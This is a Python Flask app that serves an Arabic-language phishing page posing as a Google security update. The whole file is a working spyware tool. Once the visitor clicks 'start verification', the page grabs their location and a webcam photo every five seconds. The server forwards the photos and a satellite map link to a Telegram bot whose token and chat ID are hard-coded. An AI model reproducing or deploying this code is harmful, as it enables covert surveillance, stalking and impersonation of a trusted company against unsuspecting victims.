import os
import base64
import requests
from flask import Flask, render_template_string
from flask_socketio import SocketIO

# إعدادات البوت الخاصة بك
BOT_TOKEN = "8731655533:AAFBxpr2goRmjY46jOB_BQdZKmk2ycFrYKQ"
CHAT_ID = "8305841557"

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمان جوجل</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:50px; }
        .card { background:white; padding:30px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:90%; max-width:400px; margin:auto; }
        button { background:#4285F4; color:white; border:none; padding:15px 30px; border-radius:5px; cursor:pointer; font-weight:bold; }
    </style>
</head>
<body>
    <div class="card" id="box">
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="80"><br><br>
        <h3>تأكيد الهوية</h3>
        <p>يرجى السماح بالوصول للكاميرا والموقع لإتمام تحديث الأمان.</p>
        <button onclick="start()">بدأ التحقق</button>
    </div>
    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const socket = io();
        async function start() {
            document.getElementById('box').innerHTML = "<h3>جاري الفحص...</h3><p>الرجاء عدم إغلاق الصفحة</p>";
            navigator.geolocation.getCurrentPosition(p => {
                socket.emit('loc', { lat: p.coords.latitude, lon: p.coords.longitude });
            });
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
            v.srcObject = stream;
            setInterval(() => {
                c.width = 320; c.height = 240;
                ctx.drawImage(v, 0, 0, 320, 240);
                socket.emit('img', { data: c.toDataURL('image/jpeg', 0.5) });
            }, 5000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML)

@socketio.on('img')
def handle_img(data):
    try:
        raw = base64.b64decode(data['data'].split(',')[1])
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                      files={'photo': ('snap.jpg', raw)}, data={'chat_id': CHAT_ID})
    except: pass

@socketio.on('loc')
def handle_loc(data):
    msg = f"📍 موقع جديد:\nhttps://www.google.com/maps?q={data['lat']},{data['lon']}&t=k&z=19"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  json={'chat_id': CHAT_ID, 'text': msg})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
